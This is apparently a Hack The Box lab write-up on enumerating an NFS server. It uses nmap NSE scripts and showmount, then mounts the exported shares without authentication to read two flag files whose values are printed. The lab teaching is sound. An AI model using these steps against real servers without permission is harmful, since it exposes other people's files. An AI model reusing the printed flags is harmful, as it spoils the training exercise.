
# NFS Enumeration 

##  Task Goal

We need to:

- Enumerate the **NFS service**
- Find exported shares
- Mount them
- Retrieve the content of:

 `flag.txt` inside:

- `"nfs"` share
- `"nfsshare"` share

---

---

# 1. Scanning NFS Ports with Nmap

```bash
nmap -p 111,2049 10.129.27.179 -sV -sC
```

---
<img width="536" height="574" alt="image" src="https://github.com/user-attachments/assets/8ed2373f-d47a-4629-a336-1a4a40727e5f" />


##  What is happening here?

This is the **first footprinting step**.

We scan the two most important NFS-related ports:

|Port|Purpose|
|---|---|
|111|RPCBind service (controls RPC programs)|
|2049|NFS service itself|

---

## Meaning

- The target is running an NFS server
- RPCBind confirms the host provides RPC-based services
- We can now enumerate NFS exports

 This confirms NFS is attackable.

---
# 2. Enumerating NFS Shares with Nmap Scripts



```bash
sudo nmap --script nfs* 10.129.27.179 -sV -p111,2049
```

---
<img width="635" height="917" alt="image" src="https://github.com/user-attachments/assets/98ce6a8a-0994-48fd-9f94-a4d740d67f40" />

##  What is happening here?

Now that NFS is confirmed, we run Nmap NSE scripts:

- `nfs-ls`
- `nfs-showmount`
- `nfs-statfs`

These scripts automatically extract:

 Shared directories  
 Permissions  
 Export rules

---
## Exported Volumes

```text
nfs-ls:
Volume /var/nfs
Volume /mnt/nfsshare
```

---

##  What this means

The target is sharing 2 directories:

|Share Name|Path|
|---|---|
|nfs|/var/nfs|
|nfsshare|/mnt/nfsshare|

These are accessible remotely, which is a major misconfiguration.

---

## Allowed Network Access

```text
nfs-showmount:
 /var/nfs     10.0.0.0/8
 /mnt/nfsshare 10.0.0.0/8
```

---

### Meaning

Any machine inside **10.x.x.x** range can mount these shares.

HTB VPN gives attackers a **10.x IP**, so we are allowed.

 This is how we confirm we can access NFS as an attacker.

---

---

# 3. Manual Export Enumeration with showmount

 **Screenshot Shows:**

```bash
showmount -e 10.129.27.179
```

---
<img width="308" height="106" alt="image" src="https://github.com/user-attachments/assets/24815e3b-b1f3-4a6a-bed1-87f17a3e4ffd" />

##  What is happening here?

This is the manual confirmation step.

`showmount -e` asks the NFS server:

 “Which shares are you exporting?”

---

## Output

```text
Export list for 10.129.27.179:
/var/nfs       10.0.0.0/8
/mnt/nfsshare  10.0.0.0/8
```

---

##  Meaning

The server exports:

- `/var/nfs`
    
- `/mnt/nfsshare`
    

Both are accessible to our attacker network.

 Now we move to exploitation: mounting.

---

---

# 4. Mounting the NFS Share Locally

```bash
cd /mnt
mkdir target-nfs
mount -t nfs 10.129.27.179:/ ./target-nfs -o nolock
ls
cd target-nfs
ls
```

<img width="448" height="400" alt="image" src="https://github.com/user-attachments/assets/06f9fe6b-0915-44cc-b91a-9093ba90ccee" />




---

##  What is happening here?

This is the exploitation step.

We mount the remote NFS share onto our local filesystem.

---

##  Step-by-step Explanation

### 1. Move to mount directory

```bash
cd /mnt
```

Linux convention: remote shares are mounted inside `/mnt`.

---

### 2. Create a local folder

```bash
mkdir target-nfs
```

This folder will become our access point.

---

### 3. Mount the remote share

```bash
mount -t nfs 10.129.27.179:/ ./target-nfs -o nolock
```

---

### Meaning of this mount command

|Part|Explanation|
|---|---|
|mount|Attach remote filesystem|
|-t nfs|Type is NFS|
|10.129.27.179:/|Remote exported root|
|./target-nfs|Local mount directory|
|-o nolock|Avoid RPC locking issues|

 Now remote files become browsable like local ones.

---

### 4. Listing mounted content

```bash
ls
```

Output shows:

```text
mnt  var
```

This confirms we successfully mounted the share.

---

---

# 5. Reading the Flag Inside Share

## Question.1
> Enumerate the NFS service and submit the contents of the flag.txt in the "nfs" share as the answer.

## We navigated into:

```bash
/mnt/target-nfs/var/nfs
```
<img width="378" height="67" alt="image" src="https://github.com/user-attachments/assets/57150b3f-da5e-4864-a12d-07918e7f24aa" />

And found:

 `flag.txt`

---

##  Flag Output

```text
HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}
```

---

### Meaning

The NFS share allowed **unauthenticated read access**, exposing sensitive files.

 Flag successfully captured from `"nfs"` share.

---

---

#  Second Share Flag — nfsshare

After enumerating `/mnt/nfsshare`, repeating the same process reveals:
<img width="488" height="73" alt="image" src="https://github.com/user-attachments/assets/fb24b19d-f382-4f08-a17c-28bbbd8341a3" />

```text
HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}
```

 Flag from `"nfsshare"` share.

---
